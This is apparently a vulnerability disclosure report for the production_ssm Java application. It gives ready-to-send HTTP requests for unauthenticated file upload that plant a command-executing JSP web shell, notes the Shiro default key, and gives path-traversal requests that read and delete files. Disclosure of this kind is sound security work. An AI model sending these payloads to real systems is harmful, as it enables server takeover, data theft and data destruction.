# Project

Address: [production_ssm](https://github.com/megagao/production_ssm)

# 1. Unauthorized upload of any file

## 1.1 Unauthorized upload of any file `/pic/upload`

[Suggested description]

Upload vulnerability exists at interface `/pic/upload`, because the system does not filter file suffixes, attackers can directly upload malicious jsp files to obtain system permissions

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/pic/upload

[The payload]

```
POST /pic/upload HTTP/1.1
Host: localhost:8080
Content-Length: 698
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjT7A5ZfXf3xTBtGx
Connection: close

------WebKitFormBoundaryjT7A5ZfXf3xTBtGx
Content-Disposition: form-data; name="localUrl"

C:\fakepath\hello.jsp
------WebKitFormBoundaryjT7A5ZfXf3xTBtGx
Content-Disposition: form-data; name="uploadFile"; filename="hello.jsp"
Content-Type: application/octet-stream

<%
    if("20240116".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
------WebKitFormBoundaryjT7A5ZfXf3xTBtGx--
```

[Vulnerability recurrence]

![95cf1bb9a234c6e67088fc07db3833b](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d5d14526-8ef6-4650-af86-2a649f3ec359)

![086de021454e1c95ab455d98a279fd6](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/2d079b67-65bf-4c59-aa76-c3e4e7722a6a)

[Code analysis]

Call `pictureService.uploadPicture()` to upload a file processing: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7bf6d41a-5ad0-48da-9976-0bb8dcbb84fc)

![1705414149268](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c8e0bc01-9bd5-4bf9-ac9d-80b2fe561f40)


## 1.2 Unauthorized upload of any file `/file/upload`

[Suggested description]

Upload vulnerability exists at interface `/file/upload`, because the system does not filter file suffixes, attackers can directly upload malicious jsp files to obtain system permissions

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/file/upload

[The payload]

```
POST /file/upload HTTP/1.1
Host: localhost:8080
Content-Length: 567
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUssZn7JwJW3z2hkn
Connection: close

------WebKitFormBoundaryUssZn7JwJW3z2hkn
Content-Disposition: form-data; name="uploadFile"; filename="test.jsp"
Content-Type: image/jpeg

<%
    if("20240116".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
------WebKitFormBoundaryUssZn7JwJW3z2hkn--
```

[Vulnerability recurrence]

![58b3b8d8e114c69b1661e0a51b4a8f8](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/272308c0-cb26-40c3-8f3f-3c8eba9faa16)

![663df62efc11facc02ec3ac9a6f5e33](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/9e5acfb4-3a3a-4089-b454-6059b5297477)

[Code analysis]

Call `fileService.uploadFile()` to process the uploaded file: 

![96339e52a88be2480575c162cf502e7](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/d14740e3-99dc-4702-a979-eee384d5f4a6)

![1705413821918](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/cc5c7344-0657-41cf-a71b-e8898bb166c9)


# 2. Deserialization vulnerability

[Suggested description]

The system uses an earlier version of shiro component, and its default key is "kPH+bIxk5D2deZiIxcaaaA==".  Attackers can launch deserialization vulnerability attacks through shiro's default key

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Vulnerability recurrence]

The attack is launched using the [shiro deserialization tool](https://github.com/SummerSec/ShiroAttack2/) directly

1. Burst key: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e49ba13f-8b6f-426e-9026-07a6d9eb3fc1)

2. Blasting chain:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/146fc7ea-ead2-4b01-bbd0-b6cd6959ded9)

3. Execute a command:

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e126d229-5cbb-40f5-81c3-071bb2b02754)


# 3. Arbitrary file read/download

[Suggested description]

Because the system does not filter special characters such as `.\/`, an attacker can read/download arbitrary files by passing in unexpected strings

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/file/download

[The payload]

```
GET /file/download?fileName=%2e%2e%5c%2e%2e%5c%63%6f%64%65%5c%70%61%73%73%77%6f%72%64%2e%74%78%74 HTTP/1.1
Host: localhost:8080
Connection: close


```

[Vulnerability recurrence]

![aa095dd79297969794c1c29ebf21799](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e824c929-6e62-4908-848a-1dc02a26b06c)

[Code analysis]

![37b6db40b4a35b48953b4c858490338](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/24f50f6d-f7ce-4ec0-ab8f-233586262d9b)


# 4. Arbitrary file deletion

## 4.1 Arbitrary file deletion `/file/delete`

[Suggested description]

On the `/file/delete` interface, the incoming file parameters are not filtered. As a result, an attacker can delete any file by entering a malicious string

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/file/delete

[The payload]

```
GET /file/delete?fileName=%2e%2e%5c%2e%2e%5c%63%6f%64%65%5c%70%61%73%73%77%6f%72%64%2e%74%78%74 HTTP/1.1
Host: localhost:8080
Connection: close


```

[Vulnerability recurrence]

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/8db8a355-ba55-4868-bde9-7fdcb1d6df7f)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/fd92bf79-0585-4bd8-9f30-eda1bf9fba97)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/0111014f-3ba3-4f6b-b6fd-051d73a27f00)

[Code analysis]

Call fileService.deleteFile() to delete: 

![1705474070091](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/aa6d1d23-3915-417c-8ab8-bd63e3a06f5a)

![1705474183157](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/84b489c9-547a-423b-8570-6e8529ad8019)


## 4.2 Arbitrary file deletion `/pic/delete`

[Suggested description]

On the `/pic/delete` interface, the incoming file parameters are not filtered. As a result, an attacker can delete any file by entering a malicious string

[Vendor of Product]

https://github.com/megagao/production_ssm

[Affected Product Code Base]

ALL

[Affected Component]

/pic/delete

[The payload]

```
GET /pic/delete?picName=%2e%2e%5c%2e%2e%5c%63%6f%64%65%5c%74%65%73%74%5c%64%65%6c%65%74%65%54%65%73%74%2e%74%78%74 HTTP/1.1
Host: localhost:8080
Connection: close


```

[Vulnerability recurrence]

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/c61de5aa-cbac-43b1-a249-fcf7cc29233b)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/03bd7148-4b01-4528-b314-ff4063fb6e43)

![1705474866631](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/50eb0753-a7e4-4af6-a8eb-902461b2dfd0)

[Code analysis]

Call pictureService.deleteFile() to delete: 

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/7b55640e-5025-4a3c-956d-924fab7ca1fc)

![1705475039984](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/29805d61-ee6e-4f18-a2e1-66aa0297da64)






